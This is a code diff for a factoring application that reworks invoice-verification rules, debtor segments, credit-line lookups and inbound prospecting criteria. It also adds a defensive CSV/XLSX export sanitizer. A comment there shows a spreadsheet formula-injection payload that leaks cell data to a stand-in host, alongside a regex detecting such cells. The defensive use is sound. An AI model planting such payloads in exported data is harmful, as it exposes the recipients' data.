+  { id: "V06", n: 6, name: "Desviación de la fecha de pago", variable: "abs(FchVctoDoc − FchVctoProm) / FchVctoProm", dura: false, recortado: false, desc: "Si la fecha de pago elegida se aleja del plazo histórico del par, se verifican TODAS las facturas de ese deudor", dom: "Riesgo", thr: "≤ 5%", fmt: (v) => v == null ? "sin info" : (v * 100).toFixed(1) + "%" },
+  { id: "V07", n: 7, name: "Porcentaje pagado con más de 25 días de mora", variable: "MntPagoC-D >25d mora / MntPago", dura: false, recortado: true, desc: "Deterioro del comportamiento de pago del deudor respecto de la fecha de financiamiento", dom: "Riesgo", thr: "< 3%", fmt: (v) => v == null ? "sin info" : v.toFixed(1) + "%" },
+  { id: "V08", n: 8, name: "Porcentaje de facturas reclamadas", variable: "MntFactReclamadas / MntTotalFacturas", dura: false, recortado: true, desc: "El deudor reclama facturas a su cliente: la relación comercial está cuestionada", dom: "Riesgo", thr: "< 4%", fmt: (v) => v == null ? "sin info" : v.toFixed(1) + "%" },
+  { id: "V09", n: 9, name: "Operación de alto monto", variable: "MntOpC-D", dura: true, recortado: false, desc: "Medida preventiva: gatilla si el TOTAL de la operación con ese deudor supera el umbral. Comparar además la factura individual era redundante —ninguna puede superar la suma— y hacía pensar que eran dos umbrales", dom: "Riesgo", thr: "≤ $300M", fmt: (v) => v == null ? "sin info" : "$" + v + "M" },
+  { id: "V10", n: 10, name: "Historial de pago relevante con el factoring (Ult3M)", variable: "MntPagoDeudorUlt3M", dura: false, recortado: true, desc: "Evita el falso positivo del deudor que cumple todo porque operó una sola vez: exige volumen de pago representativo", dom: "Riesgo", thr: "> $1.000M", fmt: (v) => v == null ? "sin info" : "$" + Math.round(v) + "M pagados" },
 ];
-const verifEval = (r, v) => v == null ? "na" : (r.test && r.test(v) ? "ok" : "no");
+// Criterios de cada protocolo (spec §3). El recortado son SEIS: 1, 4, 5, 7, 8 y 10.
+const VERIF_APLICAN_RECORTADO = VERIF_RULES.filter((r) => r.recortado).map((r) => r.id);
+const VERIF_APLICAN_COMPLETO = VERIF_RULES.map((r) => r.id);
 // PREDICTOR DE VERIFICACIÓN (modelo Security): decide previo al anticipo si la factura queda VERIFICADA
-// POR MODELO o requiere VERIFICACIÓN TELEFÓNICA. Segmentos: ELITE (protocolo light: V01,V04,V05,V07,V08,V10;
-// entra con Nota>3,7 + clasificación Prime/Lista Blanca + historial relevante V10 + montos no excesivos V04)
-// y OTROS (aplican V01–V10). V01: protocolo propio del deudor prevalece. V09: alto monto fuerza verificación.
+// POR MODELO o requiere VERIFICACIÓN TELEFÓNICA. Dos segmentos:
+//   PRIME  → protocolo light, 6 reglas (V01,V04,V05,V07,V08,V10). Es EXACTAMENTE el universo Prime que
+//            usa el resto de la app: Lista Blanca o Deudor Autorizado. La Nota Deudor es un insumo de
+//            esa clasificación, no su definición, así que no vuelve a filtrar acá.
+//   OTROS  → protocolo completo, las 10 reglas (agrega V02, V03, V06 y V09).
+// V01: si el deudor tiene protocolo propio de verificación, prevalece y la factura queda por modelo.
+// V09 (alto monto > MM$300) es dura pero SÓLO aplica en OTROS: un Prime no tiene techo por monto.
+// Estado del PAR cliente-deudor: todo lo que la verificación necesita y que NO depende del
+// documento ni de la simulación —protocolo propio del deudor, % pagado, recurrencia, mora, reclamos,
+// historial de pago—. En producción esto es una fila precalculada por el batch y esta función es el
+// SELECT; acá se sintetiza de forma determinista y se memoiza.
+// La semilla es el PAR, no el folio: sembrar por documento re-sorteaba estos atributos en cada
+// factura, así que el mismo deudor salía con protocolo propio en un folio y sin él en el siguiente
+// —el 88% de los pares daba veredictos mezclados— y no había nada estable que precalcular.
+const _VERIF_PAR = new Map();
+function verifPar(rutCliente, nombre, tipo) {
+  const k = (rutCliente || "") + "|" + (nombre || "");
+  const hit = _VERIF_PAR.get(k);
+  if (hit) return hit;
+  const sc = scoreDeudor(nombre, tipo).score, nota = notaFromScore(sc);
+  const h = Math.abs(hashStr("vp" + k));
+  const bueno = nota >= 4.0, malo = nota < 3.2;
+  const prime = tipo === "Lista Blanca" || tipo === "Deudor Autorizado";
+  // Protocolo recortado: prime O nota sobre el corte. Son DOS poblaciones distintas y basta
+  // pertenecer a una (spec §3); antes sólo se miraba prime y la nota no abría el protocolo light.
+  const recortado = prime || nota > NOTA_PRIORITARIA;
+  const out = {
+    nombre, tipo, nota, sc, prime, recortado,
+    grupo: prime ? "prime" : (nota > NOTA_PRIORITARIA ? "nota_alta" : "otros"),
+    segmento: recortado ? "PRIME" : "OTROS",
+    aplican: recortado ? VERIF_APLICAN_RECORTADO : VERIF_APLICAN_COMPLETO,
+    // ── Variables del deudor o del par (spec §7.1). En producción es una fila precalculada con
+    //    refresco diario y esta función es el SELECT; acá se sintetizan de forma determinista.
+    protocolo: (h % 11 === 0) ? { existe: true, id: "PROT-" + String(1000 + (h % 9000)) } : { existe: false, id: null },
+    pctPagoDeudor3M: malo ? +(82 + (h % 8)).toFixed(1) : +Math.min(100, (bueno ? 95 : 90) + (h % 6)).toFixed(1),
+    mntCompraOp3M: bueno ? 120 + (h % 400) : 40 + (h % 160),      // MM comprados al par en 3M móviles
+    avgVentaProm3M: bueno ? 200 + (h % 600) : 60 + (h % 200),     // MM de venta promedio del par (libro compraventa)
+    mesesConVenta6M: bueno ? 4 + (h % 3) : 2 + (h % 4),
+    fchVctoProm: 40 + (h % 8),                                    // días: plazo histórico de pago del par
+    pctMora25d: +Math.max(0, (bueno ? 0.5 : 2.5) + (h % 4) - 1).toFixed(1),
+    pctReclamadas: +Math.max(0, (bueno ? 0.5 : 3) + ((h >> 3) % 5) - 1).toFixed(1),
+    mntPagoDeudor3M: bueno ? 900 + (h % 2600) : 60 + (h % 900),   // MM pagados por el deudor en 3M
+    h,
+  };
+  _VERIF_PAR.set(k, out);
+  return out;
+}
+// ── DECISIÓN DE VERIFICACIÓN · función aislada (spec-verificacion-facturas.md §6) ───────────────
+// Decide si las facturas de UN DEUDOR dentro de una operación deben verificarse con él. La decisión
+// es por DEUDOR, no por factura: ninguna regla discrimina entre facturas del mismo deudor, y las que
+// nacen a nivel documento —6 y 9— escalan al conjunto para que el contacto quede consistente.
+// Devuelve siempre la lista completa de criterios evaluados, no sólo el veredicto: el ejecutivo
+// necesita saber cuál falló para decidir si le conviene editar la operación.
+function verifDecision(par, facturas) {
+  const fs = (facturas || []).filter(Boolean);
+  const montoOp = +fs.reduce((s, f) => s + (f.montoMM || 0), 0).toFixed(1);
+  // Regla 6 sobre el conjunto: la desviación que manda es la mayor de las facturas del deudor.
+  const desvVcto = fs.length && par.fchVctoProm
+    ? Math.max(...fs.map((f) => Math.abs((f.venc != null ? f.venc : par.fchVctoProm) - par.fchVctoProm) / par.fchVctoProm))
+    : null;
+  // Valor de cada regla. `null` = dato no disponible, que la spec trata como INCUMPLIMIENTO (§4.3):
+  // no hay estado intermedio, y por eso un deudor nuevo —sin historial para 2, 5 y 10— se verifica
+  // por construcción.
+  const vals = {
+    V01: par.protocolo.existe,
+    V02: par.pctPagoDeudor3M,
+    V03: par.mntCompraOp3M ? +(montoOp / par.mntCompraOp3M).toFixed(2) : null,
+    V04: par.avgVentaProm3M ? +(montoOp / par.avgVentaProm3M).toFixed(2) : null,
+    V05: par.mesesConVenta6M,
+    V06: desvVcto == null ? null : +desvVcto.toFixed(4),
+    V07: par.pctMora25d,
+    V08: par.pctReclamadas,
+    V09: montoOp,
+    V10: par.mntPagoDeudor3M,
+  };
+  const cumple = {
+    V01: true, // la 1 no se evalúa como criterio: es la compuerta de más abajo
+    V02: (v) => v != null && v >= 90,
+    V03: (v) => v != null && v <= 1.3,
+    V04: (v) => v != null && v < 1.0,
+    V05: (v) => v != null && v >= 4,      // ≥ 4, no > 4
+    V06: (v) => v != null && v <= 0.05,   // 5% del plazo promedio, no 5 días
+    V07: (v) => v != null && v < 3,
+    V08: (v) => v != null && v < 4,
+    V09: (v) => v != null && v <= 300,
+    V10: (v) => v != null && v > 1000,    // umbral fijo, no 20× la operación
+  };
+  // 1 · COMPUERTA: si el deudor tiene protocolo propio, se verifica siempre con ese protocolo y no
+  //     se evalúa nada más (spec §4.1). Antes esto estaba invertido: el protocolo EVITABA la llamada.
+  const evals = VERIF_RULES.map((r) => {
+    const v = vals[r.id];
+    let st;
+    if (!par.aplican.includes(r.id)) st = "na";
+    else if (r.id === "V01") st = par.protocolo.existe ? "no" : "ok";
+    else if (par.protocolo.existe) st = "na";  // cortocircuito: no se evaluaron
+    else st = cumple[r.id](v) ? "ok" : "no";
+    return { r, v, st, dato: v != null };
+  });
+  const segLbl = par.recortado ? (par.prime ? "Deudores Prime (protocolo recortado)" : "Nota > " + String(NOTA_PRIORITARIA).replace(".", ",") + " (protocolo recortado)") : "Otros deudores (protocolo completo)";
+  if (par.protocolo.existe) {
+    return { requiere: true, motivo: "protocolo", vals, evals, fallidas: [],
+      texto: `Segmento ${segLbl} · el deudor tiene protocolo de confirmación propio (${par.protocolo.id}): se verifica siguiendo ese protocolo.` };
+  }
+  // 2 · UNANIMIDAD: para EVITAR la verificación hay que superar todos los criterios aplicables. Es
+  //     una conjunción, no una mayoría (spec §4.2).
+  const fallidas = evals.filter((e) => e.st === "no");
+  if (!fallidas.length) {
+    return { requiere: false, motivo: null, vals, evals, fallidas,
+      texto: `Segmento ${segLbl} · todos los criterios aplicables dentro de umbral → no requiere contacto con el deudor.` };
+  }
+  const d = fallidas[0];
+  return { requiere: true, motivo: "criterio_incumplido", vals, evals, fallidas,
+    texto: `Segmento ${segLbl} · ${d.r.id} (regla ${d.r.n}) ${d.dato ? "fallida" : "sin dato"}: ${d.r.name} = ${d.r.fmt(d.v)} (umbral ${d.r.thr})${fallidas.length > 1 ? ` y ${fallidas.length - 1} criterio(s) más` : ""} → requiere verificación con el deudor antes de girar.` };
+}
+// Veredicto para las facturas que ese deudor tiene en la operación. Se conserva la forma de salida
+// que consume la UI (`vals`, `evals`, `est`, `motivo`) sobre la decisión de `verifDecision`.
+function verifEvaluar(par, facturas) {
+  const r = verifDecision(par, facturas);
+  return { vals: r.vals, evals: r.evals, fallidas: r.fallidas, est: r.requiere ? "tel" : "ok", motivo: r.texto, razon: r.motivo };
+}
+// Facturas que ese deudor tiene en la operación: es la unidad real de la decisión y de la llamada.
+function facturasDeudorEnDeal(deal, nombre) {
+  const fs = (deal && deal.facturasOp) || [];
+  const suyas = fs.filter((f) => f && f.deudor === nombre);
+  return suyas.length ? suyas : null;
+}
+// ¿Requiere llamada este DEUDOR de la oportunidad? No necesita simulación: es la consulta al estado
+// del par más las facturas suyas que hoy están en la oferta.
+function verifDeudorDeal(deal, nombre, montoMM) {
+  const rut = (deal && (deal.rutEmisor || deal.cliente)) || "";
+  const tipo = tipoDeudor(null, nombre);
+  const par = verifPar(rut, nombre, tipo);
+  const fs = facturasDeudorEnDeal(deal, nombre) || (montoMM ? [{ montoMM }] : []);
+  const r = verifEvaluar(par, fs);
+  return { requiere: r.est !== "ok", motivo: r.motivo, par };
+}
+// La verificación de una factura ES la de su deudor: una llamada cubre todas sus facturas, así que
+// todas comparten veredicto. Evaluarla con el monto del documento daba resultados distintos entre
+// facturas del mismo deudor y volvía inconsistente el contacto.
 function verifFactura(f, deal) {
   const tipo = tipoDeudorDisp(f), nombre = f.deudor;
-  const sc = scoreDeudor(nombre, tipo).score, nota = notaFromScore(sc);
-  const h = Math.abs(hashStr("vf" + (f.folio || "") + "|" + nombre));
-  const bueno = nota >= 4.0, malo = nota < 3.2;
-  const op = f.montoMM || 0;
-  const vals = {
-    V01: (h % 11 === 0),
-    V02: malo ? +(82 + (h % 8)).toFixed(1) : +Math.min(100, (bueno ? 95 : 90) + (h % 6)).toFixed(1),
-    V03: +((bueno ? 0.6 : 0.95) + (h % 90) / 100).toFixed(2),
-    V04: +((bueno ? 0.4 : 0.8) + (h % 80) / 100).toFixed(2),
-    V05: bueno ? 4 + (h % 3) : 2 + (h % 4),
-    V06: (h % 9),
-    V07: +Math.max(0, (bueno ? 0.5 : 2.5) + (h % 4) - 1).toFixed(1),
-    V08: +Math.max(0, (bueno ? 0.5 : 3) + ((h >> 3) % 5) - 1).toFixed(1),
-    V09: op,
-    V10: Math.round(op * (bueno ? 25 + (h % 30) : 5 + (h % 20))),
-  };
-  const v10ok = vals.V10 > 20 * op || vals.V10 > 1500;
-  const elite = nota > 3.7 && tipo === "Lista Blanca" && v10ok && vals.V04 < 1.0;
-  const segmento = elite ? "ELITE" : "OTHERS";
-  const aplican = elite ? ["V01", "V04", "V05", "V07", "V08", "V10"] : ["V01", "V02", "V03", "V04", "V05", "V06", "V07", "V08", "V09", "V10"];
-  const evals = VERIF_RULES.map((r) => {
-    const val = vals[r.id]; let st;
-    if (!aplican.includes(r.id)) st = "na";
-    else if (r.id === "V01") st = "ok";
-    else if (r.id === "V10") st = v10ok ? "ok" : "no";
-    else st = r.test(val) ? "ok" : "no";
-    return { r, v: val, st };
-  });
-  const fallidas = evals.filter((e) => e.st === "no");
-  const protocolo = vals.V01;
-  const est = protocolo ? "ok" : (fallidas.length ? "tel" : "ok");
-  const segLbl = elite ? "Deudores Elite (protocolo light)" : "Otros deudores";
-  let motivo = "";
-  if (protocolo) motivo = `Segmento ${segLbl} · el deudor posee protocolo de verificación propio: prevalece su protocolo (V01).`;
-  else if (est === "ok") motivo = `Segmento ${segLbl} · todos los criterios aplicables dentro de umbral → VERIFICADA POR MODELO.`;
-  else { const d = fallidas[0]; motivo = `Segmento ${segLbl} · ${d.r.id} fallida: ${d.r.name} = ${d.r.fmt(d.v)} (umbral ${d.r.thr})${vals.V09 > 300 ? " · documento alto monto (>MM$300) fuerza verificación" : ""} → VERIFICACIÓN TELEFÓNICA antes de girar.`; }
+  const rut = (deal && (deal.rutEmisor || deal.cliente)) || "";
+  const par = verifPar(rut, nombre, tipo);
+  const r = verifEvaluar(par, facturasDeudorEnDeal(deal, nombre) || [f]);
   let tel = null;
-  if (est === "tel") { const idx = h % 3; const estl = ["Completada", "En curso", "Pendiente"][idx]; tel = { estado: estl, checks: estl === "Completada" ? [1, 1, 1] : estl === "En curso" ? [1, 0, 0] : [0, 0, 0], who: estl === "Pendiente" ? null : `${(typeof EXECS !== "undefined" && EXECS[deal.exec]) || "Ejecutivo"} · ${nowStamp()}` }; }
-  return { vals, evals, fallidas, hard: false, est, motivo, tel, exc: null, nombre, tipo, nota, sc, segmento };
+  if (r.est === "tel") { const idx = par.h % 3; const estl = ["Completada", "En curso", "Pendiente"][idx]; tel = { estado: estl, checks: estl === "Completada" ? [1, 1, 1] : estl === "En curso" ? [1, 0, 0] : [0, 0, 0], who: estl === "Pendiente" ? null : `${(typeof EXECS !== "undefined" && EXECS[deal && deal.exec]) || "Ejecutivo"} · ${nowStamp()}` }; }
+  return { vals: r.vals, evals: r.evals, fallidas: r.fallidas, hard: false, est: r.est, motivo: r.motivo, tel, exc: null,
+    nombre, tipo: par.tipo, nota: par.nota, sc: par.sc, segmento: par.segmento };
 }
 // Resumen por operación para el chip de la card y el banner: totales, en verificación telefónica pendiente.
 function verifResumenDeal(deal) {
@@ -1451,19 +1619,47 @@ function catDisp(deal) {
   else q = `${Math.round(ci.sA * 100)}% muy buenos`;
   return { ...ci, label, q };
 }
-// Línea de crédito aprobada por cliente (determinista, en MM). Si el monto de la operación la supera,
-// la oportunidad requiere Otorgamiento (aprobación manual de un especialista).
+// Línea de crédito aprobada por cliente (en MM). FUENTE ÚNICA: LINEAS_DATA, que es lo que muestra el
+// módulo Líneas y lo que cuenta el Dashboard. Antes esto devolvía un hash sintético por RUT con mínimo
+// 300, así que NUNCA daba 0: el tubo le inventaba una línea aprobada a empresas que la pantalla Líneas
+// declaraba «Sin línea», y las dos pantallas se contradecían sobre si el cliente podía cursar.
+// 0 es ahora un resultado legítimo y significa exactamente eso: no tiene línea, no puede cursar.
+let _lineaIdx = null;
+function lineaIdxPorRut() {
+  if (_lineaIdx) return _lineaIdx;
+  let arr;
+  try { arr = LINEAS_DATA; } catch (_) { return null; } // se declara más abajo: si aún no existe, no se indexa
+  if (!Array.isArray(arr)) return null;
+  _lineaIdx = new Map(arr.map((l) => [l.rut, l]));
+  return _lineaIdx;
+}
+// Fila completa de la línea en LINEAS_DATA (aprobada + uso), o null si el cliente no tiene línea o si
+// LINEAS_DATA aún no está inicializada.
+function lineaDeCliente(deal) {
+  const idx = lineaIdxPorRut();
+  return idx ? (idx.get((deal && deal.rutEmisor) || "") || null) : null;
+}
 function lineaAprobadaDe(deal) {
-  const h = hashStr((deal.rutEmisor || deal.cliente || "") + "linea");
-  return 300 + (h % 21) * 50; // ~300–1300 MM en tramos de 50
+  const l = lineaDeCliente(deal);
+  if (lineaIdxPorRut()) return l ? l.aprobada : 0;
+  const h = hashStr((deal.rutEmisor || deal.cliente || "") + "linea"); // sin datos inyectados
+  return 300 + (h % 21) * 50;
 }
 // Estado de la línea de crédito del cliente: aprobada, uso actual, disponible y PROYECCIÓN tras el curse
 // (uso actual + monto de esta operación). "Fuera de línea" = la proyección supera la línea aprobada.
 function lineaCreditoDe(deal) {
-  const aprobada = lineaAprobadaDe(deal);
-  const h = hashStr((deal.rutEmisor || deal.cliente || "") + "uso");
-  // Cliente nuevo (nunca ha operado): línea sin uso previo → uso actual 0, disponible = línea completa.
-  const usoActual = esClienteNuevoNEX(deal) ? 0 : +(aprobada * (0.20 + (h % 50) / 100)).toFixed(1); // 20%–70% ya utilizado
+  const l = lineaDeCliente(deal);
+  const aprobada = l ? l.aprobada : lineaAprobadaDe(deal);
+  // FUENTE ÚNICA para `aprobada` Y para `uso`. Antes sólo la línea aprobada venía de LINEAS_DATA y el
+  // uso se fabricaba con hashStr(rut+"uso"): la mesa Líneas y el drawer de la oportunidad mostraban
+  // utilizado/disponible DISTINTOS para el mismo cliente (difieren en las 233 líneas), y la oferta se
+  // recortaba contra la cifra equivocada. La fila se consulta ANTES que esClienteNuevoNEX a propósito:
+  // si el cliente tiene fila, la mesa ya le está mostrando ese uso al ejecutivo y devolver 0 acá
+  // reintroduciría la contradicción.
+  let usoActual;
+  if (l) usoActual = +(l.uso || 0).toFixed(1);
+  else if (esClienteNuevoNEX(deal)) usoActual = 0; // nunca ha operado: línea sin uso previo
+  else { const h = hashStr((deal.rutEmisor || deal.cliente || "") + "uso"); usoActual = +(aprobada * (0.20 + (h % 50) / 100)).toFixed(1); } // sólo sin datos inyectados
   const montoOp = +(deal.amountMM || 0).toFixed(1);
   const proyectado = +(usoActual + montoOp).toFixed(1);
   const disponible = +(aprobada - usoActual).toFixed(1);
@@ -1569,9 +1765,31 @@ const OTRO_FOP_POR_CEDENTE = (() => {
   Object.keys(m).forEach((k) => { if (m[k].length > 4) m[k] = m[k].slice(0, 4); });
   return m;
 })();
+// ¿El cedente tiene linea asignada por comite? Es la MISMA condicion que define la pertenencia a
+// LINEAS_DATA (cliente no «Inactivo»), pero leida de SOW_POR_RUT, que ya existe en este punto del
+// modulo: referenciar LINEAS_DATA aca la usaria antes de su inicializacion.
+function cedenteConLinea(rut) {
+  const s = SOW_POR_RUT[rut];
+  return !!s && !String(s.SOWTendencia || "").toLowerCase().includes("nuevo");
+}
+// El dato reparte los cedentes casi mitad y mitad entre clientes con linea asignada y clientes
+// nuevos (que solo tienen la LF1 de $30M). Tomado en orden, la mitad del tubo mostraba ofertas donde
+// casi todo va a comite por no haber pasado aun por el comite de lineas — cierto, pero poco util
+// para ver el analisis de linea trabajando. Se intercalan 2:1 a favor de los que tienen linea. No se
+// descarta ningun registro: solo cambia el orden de llegada.
+function sesgarACedentesConLinea(stream) {
+  const con = [], sin = [];
+  for (const e of stream) (cedenteConLinea(e.rutEmisor) ? con : sin).push(e);
+  const out = []; let i = 0, j = 0;
+  while (i < con.length || j < sin.length) {
+    for (let k = 0; k < 3 && i < con.length; k++) out.push(con[i++]);
+    if (j < sin.length) out.push(sin[j++]);
+  }
+  return out;
+}
 const INBOUND_STREAM = (() => {
   // Si el webhook DTESync entregó su colección (inyectada por el build), se usa como fuente real.
-  if (typeof window !== "undefined" && Array.isArray(window.DTESYNC) && window.DTESYNC.length) return streamDesdeDTE(window.DTESYNC);
+  if (typeof window !== "undefined" && Array.isArray(window.DTESYNC) && window.DTESYNC.length) return sesgarACedentesConLinea(streamDesdeDTE(window.DTESYNC));
   const base = generarStream(30000, STREAM_SEED.map(normalizarSeed)); // fallback sintético (~30.000 facturas / mes)
   const sum = base.reduce((s, e) => s + (e.monto || 0), 0) || 1;
   const factor = (BUDGET_MES_MM * AMPLIF_BUDGET) / sum;
@@ -1642,9 +1860,20 @@ const CRITERIO_PRED = {
   // Criterios a nivel FACTURA: una factura ELEGIBLE para inbound es a crédito, no reclamada, sin nota de
   // crédito y con deudor que abre oportunidad: Lista Blanca, Autorizado o histórico del último año
   // (con BICE = CAT1, con otro factor = CAT4). Los deudores "Otro" sin historia quedan excluidos.
-  "Buena factura": (f) => f.credito && !f.reclamada && !f.notaCredito && f.inboundBucket && f.inboundBucket !== "OTRO",
-  "Deudor elegible": (f) => f.inboundBucket && f.inboundBucket !== "OTRO",
+  // Deudor que abre oportunidad: el que está en una lista (bucket elegible) O el que alcanza la Nota
+  // de corte. Antes sólo contaba el bucket, que por construcción excluye a los no listados — así que
+  // la lista ND>4,2 no podía capturar nada aunque el deudor tuviera nota 4,6.
+  "Buena factura": (f) => f.credito && !f.reclamada && !f.notaCredito && deudorAbreOportunidad(f),
+  "Deudor elegible": (f) => deudorAbreOportunidad(f),
   "Crédito": (f) => f.credito,
+  // TIPO DE DEUDOR de la prospección: tres poblaciones, no cinco. La lista Prime —que junta Lista
+  // Blanca y Autorizados—, los que alcanzan la Nota de corte sin estar en la lista, y los que el
+  // cliente ya factorizó con nosotros y no tienen bloqueo vigente. Los criterios viejos quedan como
+  // ALIAS a propósito: las reglas se persisten en localStorage y una regla guardada que apunte a un
+  // criterio inexistente califica TODO (ver `facturaCalifica`, que ignora lo que no conoce).
+  "Lista Deudores Prime": (f) => f.tipoDeudor === "Lista Blanca" || f.tipoDeudor === "Deudor Autorizado",
+  "Lista Deudores ND>4.2": (f) => notaDeudorEvento(f) > NOTA_PRIORITARIA,
+  "Deudores históricos Security sin Bloqueo": (f) => f.histFactoring === "bice" && !bloqueoDeudor(f.pagador || f.deudor),
   "Deudor Lista Blanca": (f) => f.tipoDeudor === "Lista Blanca",
   "Deudor Autorizado": (f) => f.tipoDeudor === "Deudor Autorizado",
   "Histórico BICE": (f) => f.histFactoring === "bice",
@@ -1667,11 +1896,16 @@ function clasificarFactura(f, reglas) {
 }
 function criteriosDesdeFactura(f) {
   const c = [];
-  if (f.credito && !f.reclamada && !f.notaCredito && f.inboundBucket && f.inboundBucket !== "OTRO") c.push("Buena factura");
-  if (f.tipoDeudor === "Lista Blanca") c.push("Deudor Lista Blanca");
-  else if (f.tipoDeudor === "Deudor Autorizado") c.push("Deudor Autorizado");
-  else if (f.histFactoring === "bice") c.push("Histórico BICE");
+  if (f.credito && !f.reclamada && !f.notaCredito && deudorAbreOportunidad(f)) c.push("Buena factura");
+  // Un deudor puede estar en más de una lista —un histórico Security suele pasar también el corte de
+  // nota—, así que el perfil nombra la MÁS ESPECÍFICA: primero las listas por pertenencia y al final
+  // la de nota, que es la que recoge a los que no están en ninguna otra.
+  if (f.tipoDeudor === "Lista Blanca" || f.tipoDeudor === "Deudor Autorizado") c.push("Lista Deudores Prime");
+  // El bloqueo se nombra: es la diferencia entre «no tenemos regla para esto» y «riesgo lo tiene
+  // bloqueado», y sólo la segunda explica por qué la factura no se puede capturar.
+  else if (f.histFactoring === "bice") c.push(bloqueoDeudor(f.pagador || f.deudor) ? "Histórico Security con bloqueo (excluido)" : "Deudores históricos Security sin Bloqueo");
   else if (f.histFactoring === "otro") c.push("Histórico otro factor");
+  else if (notaDeudorEvento(f) > NOTA_PRIORITARIA) c.push("Lista Deudores ND>4.2");
   else c.push("Otro deudor (excluido)");
   c.push(f.esCliente ? "Cliente" : "No Cliente");
   if (f.sowTendencia === "Decreciente") c.push("SOW a la baja");
@@ -1682,7 +1916,7 @@ function criteriosDesdeFactura(f) {
 // ---- Persistencia de reglas (localStorage, a prueba de fallos) ----
 // Persiste en un entorno real (app/dev server). Si el almacenamiento no está
 // disponible (ej. vista previa restringida), degrada a memoria sin romperse.
-const RULES_KEY = "nex_inbound_rules_v3"; // v3: agrega reglas de históricos (BICE / otro factor) y elegibilidad por bucket
+const RULES_KEY = "nex_inbound_rules_v4"; // v4: tipos de deudor de prospección (Prime / ND>4,2 / históricos Security sin bloqueo)
 function storageDisponible() {
   try { return typeof window !== "undefined" && !!window.localStorage; } catch { return false; }
 }
@@ -1910,6 +2144,9 @@ const CRITERIO_PATRONES = [
   { re: /cr[eé]dito/i, chip: "Crédito" },
   { re: /cat\W*1|categor[ií]a\s*1|≥\s*60|sobre\s*60|m[aá]s\s*de\s*60/i, chip: "CAT-1" },
   { re: /cat\W*2|categor[ií]a\s*2|menos\s*de\s*60|<\s*60/i, chip: "CAT-2" },
+  { re: /\bprime\b/i, chip: "Lista Deudores Prime" },
+  { re: /nd\s*[>\u2265]?\s*4[.,]?2|nota\s*(deudor\s*)?[>\u2265]\s*4[.,]?2|sobre\s*4[.,]2/i, chip: "Lista Deudores ND>4.2" },
+  { re: /hist[o\u00f3]ric[ao].*(security|propi|nuestr)|sin\s*bloqueo/i, chip: "Deudores históricos Security sin Bloqueo" },
   { re: /lista\s*blanca/i, chip: "Deudor Lista Blanca" },
   { re: /autorizad/i, chip: "Deudor Autorizado" },
   { re: /hist[oó]ric[ao].*(bice|propi|nuestr)|ya\s*factoriz/i, chip: "Histórico BICE" },
@@ -2046,8 +2283,8 @@ function evalAtribucion(orig, nueva, tasaBanda, esTasa) {
 const ATRIB_CHIP = {
   ok: { fg: "#16A34A", lbl: "dentro de atribución", icon: "✓" },
   requiereJefe: { fg: "#C2410C", lbl: "requiere jefatura", icon: "▲" },
-  requiereGerente: { fg: "#DC2626", lbl: "requiere gerente comercial", icon: "▲" },
-  bajoMinimo: { fg: "#DC2626", lbl: "bajo la tasa mínima", icon: "✕" },
+  requiereGerente: { fg: "#EF4444", lbl: "requiere gerente comercial", icon: "▲" },
+  bajoMinimo: { fg: "#EF4444", lbl: "bajo la tasa mínima", icon: "✕" },
 };
 const ORDEN_ATRIB = { ok: 0, requiereJefe: 1, requiereGerente: 2, bajoMinimo: 3 };
 function atribResumen(evals) {
@@ -2099,10 +2336,33 @@ function ofertaWhatsApp(d, tasa, opts = {}) {
     `Facturas consideradas:\n${lista}\n` +
     `¿Confirmas el cierre en estas condiciones?`;
 }
+// ============================================================
+// A03 — INJECTION · SALIDA A PLANILLAS (CSV / XLSX)
+// ============================================================
+// Excel, LibreOffice y Google Sheets EJECUTAN el contenido de una celda que empieza con "=", "+", "-",
+// "@" o con TAB/CR. Como los exportes llevan razones sociales y nombres de deudor que vienen de fuera
+// (feed diario de proveedores, DTESync, AECSync), una empresa llamada
+//   =HYPERLINK("http://x/?"&A1,"Actualiza tus datos")
+// se convierte en un enlace ejecutable en la planilla de quien abre el archivo, con acceso a las demás
+// celdas. No es XSS en la app: es inyección en la herramienta del destinatario, y la app es el vector.
+// La defensa estándar es anteponer un apóstrofo, que fuerza el tipo texto sin cambiar lo que se lee.
+const CELDA_PELIGROSA = /^[=+\-@\t\r]/;
+function celdaSegura(v) {
+  if (v == null) return "";
+  if (typeof v === "number" || typeof v === "boolean") return v; // los números no se reinterpretan
+  const str = String(v);
+  return CELDA_PELIGROSA.test(str) ? "'" + str : str;
+}
+const filaSegura = (fila) => fila.map(celdaSegura);
 // Itemiza las facturas de una operación. Usa deal.facturasOp si existe; si no, las genera
 // a partir de los deudores (cantidad y monto), con folio, vencimiento y estado XML por factura.
 function itemizarFacturas(deal) {
-  if (deal.facturasOp && deal.facturasOp.length) return deal.facturasOp;
+  // Un array VACIO es una respuesta, no la ausencia de dato: la oferta todavia no se arma
+  // —la corrida horaria ya no la propone— o el ejecutivo retiro la ultima factura. Sin esta
+  // distincion se sintetizaba una oferta desde `deudores` y la pantalla mostraba facturas que
+  // nadie selecciono. `undefined` sigue queriendo decir «itemiza desde los deudores» (splits,
+  // paquetes re-armados desde la BD).
+  if (Array.isArray(deal.facturasOp)) return deal.facturasOp;
   const dl = (deal.deudores && deal.deudores.length) ? deal.deudores : [{ name: deal.deudor, facturas: deal.facturas || 1, montoMM: deal.amountMM || 0 }];
   const out = [];
   dl.forEach((dd) => {
@@ -2113,6 +2373,107 @@ function itemizarFacturas(deal) {
     }
   });
   return out;
+}
+// ── SELECCIÓN DE FACTURAS CONTRA LA LÍNEA DISPONIBLE ────────────────────────────────────────
+// La oferta no puede armarse por sobre el cupo del cliente: una operación que YA NACE fuera de línea
+// obliga a un otorgamiento que no debería existir y ensucia el tubo. Las facturas se ordenan por
+// calidad del deudor —primero los PRIME (Lista Blanca / Deudor Autorizado), después por nota del
+// deudor (5 es el mejor pagador) y a igual nota por monto— y se van tomando mientras quepan en el
+// disponible. Lo que no cabe NO se pierde: queda en el pool de «otras facturas», donde el ejecutivo
+// puede incorporarlo a mano (y ahí sí la operación pasará por otorgamiento, que es lo correcto).
+const ORDEN_DEUDOR = { "Lista Blanca": 0, "Deudor Autorizado": 1, "Histórico BICE": 2, "Histórico": 3, "Otro": 4 };
+function ordenarPorCalidadDeudor(facturas) {
+  return facturas
+    .map((f) => {
+      // Los históricos del último año NO son «Otro»: viven en f.histFactoring, y es tipoDeudorDisp quien
+      // los traduce. Leyendo el campo crudo, los tramos «Histórico BICE»/«Histórico» de ORDEN_DEUDOR eran
+      // código muerto, toda factura histórica caía en el último tramo, y el desempate terminaba
+      // resolviéndose por el hash del nombre del deudor — con una nota distinta de la que la UI exhibe
+      // para esa misma factura.
